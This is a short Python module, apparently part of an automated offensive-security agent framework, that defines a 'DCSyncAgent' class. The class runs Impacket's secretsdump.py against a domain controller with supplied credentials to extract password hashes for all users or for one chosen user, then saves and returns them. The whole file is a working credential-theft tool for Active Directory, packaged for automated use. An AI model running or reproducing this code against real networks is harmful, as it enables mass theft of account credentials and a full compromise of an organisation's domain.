"""DCSync Agent - Extract password hashes using DCSync attack"""
import asyncio, os, logging
from typing import Dict, Any
from core.base_agent import BaseAgent
from core.agent_data import AgentData

log = logging.getLogger(__name__)

class DCSyncAgent(BaseAgent):
    def __init__(self):
        super().__init__(name="DCSyncAgent", description="Perform DCSync attack to extract password hashes", version="1.0.0")
        self.output_dir = "workspace/dcsync"
        os.makedirs(self.output_dir, exist_ok=True)
    
    async def run(self, strategy: Dict[str, Any]) -> AgentData:
        try:
            domain, username, password, dc_ip = strategy.get('domain'), strategy.get('username'), strategy.get('password'), strategy.get('dc_ip')
            target_user = strategy.get('target_user', 'all')
            
            if not all([domain, username, password, dc_ip]):
                return AgentData(success=False, errors=["Missing required parameters"])
            
            # Use Impacket secretsdump.py
            cmd = ['secretsdump.py', f'{domain}/{username}:{password}@{dc_ip}', '-just-dc']
            if target_user != 'all':
                cmd.extend(['-just-dc-user', target_user])
            
            cmd.extend(['-outputfile', f'{self.output_dir}/dcsync_hashes'])
            
            process = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                hashes = [line for line in stdout.decode().split('\n') if ':::' in line]
                return AgentData(success=True, data={'hashes': hashes, 'count': len(hashes), 'output_dir': self.output_dir})
            else:
                return AgentData(success=False, errors=[stderr.decode()])
        except Exception as e:
            return AgentData(success=False, errors=[str(e)])
